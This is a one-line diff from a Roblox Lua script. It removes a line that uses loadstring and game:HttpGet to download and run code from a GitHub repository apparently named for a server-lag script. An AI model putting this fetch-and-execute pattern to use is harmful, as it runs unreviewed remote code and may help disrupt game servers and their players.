@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dudeididntliterally/KATLAGSERVERSCRIPT/main/main.lua", true))() --open source
